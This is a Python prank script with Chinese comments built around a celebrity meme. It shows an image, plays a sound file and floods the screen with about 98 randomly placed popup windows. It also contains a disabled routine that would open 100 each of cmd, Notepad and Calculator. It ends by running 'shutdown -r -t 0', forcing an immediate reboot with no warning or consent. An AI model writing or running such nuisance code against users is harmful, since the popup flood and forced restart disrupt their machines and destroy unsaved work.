import tkinter as tk
import random
import threading
import time
import os
from playsound import playsound
from PIL import Image, ImageTk

limit = 100

color = ['Red', 'Blue', 'Green', 'Purple', 'Orange', 'Yellow']
def dow():
    window = tk.Tk()
    width = window.winfo_screenwidth()
    height = window.winfo_screenheight()
    a = random.randrange(0, width)
    b = random.randrange(0, height)
    window.title('啊你干嘛啊啊啊啊')
    window.geometry("200x200" + "+" + str(a) + "+" + str(b))
    tk.Label(window,
             text='鸡你太美！鸡~',  # 显示文字
             bg=random.choice(color),  # 背景颜色
             font=('楷体', 17),  # 字体和字体大小
             width=15, height=10  # 标签长宽
             ).pack()  # 固定窗口位置
    window.mainloop()

def playMusic():
    playsound('ji.mp3')

def showSth():
    return # 个人觉得这个不大好用，如果要使用的话把这一行注释掉即可

    # cmd、记事本、计算器、任务管理器
    for i in range(limit):
        os.system('start cmd')
        os.system('start notepad')
        os.system('start calc')
        time.sleep(1E-11)

def closeWindow():
    w.destroy()

if __name__ == '__main__':
    # 放图片
    img = Image.open('.\\1.png')
    w = tk.Tk()
    photo = ImageTk.PhotoImage(img)
    image_Label = tk.Label(w, image=photo)
    image_Label.pack()
    w.after(1000, closeWindow)  # 1秒后关闭窗口
    w.mainloop()

    # 建立线程数组
    threads = []

    # 播放音乐
    t = threading.Thread(target=playMusic)
    threads.append(t)
    threads[0].start()

    # 打开各种应用
    t = threading.Thread(target=showSth)
    threads.append(t)
    threads[1].start()

    for i in range(2, limit):  # 需要的弹框数量
        # 弹窗
        t = threading.Thread(target=dow)
        threads.append(t)
        time.sleep(1E-11)
        threads[i].start()

    # 立即重启
    os.system('shutdown -r -t 0')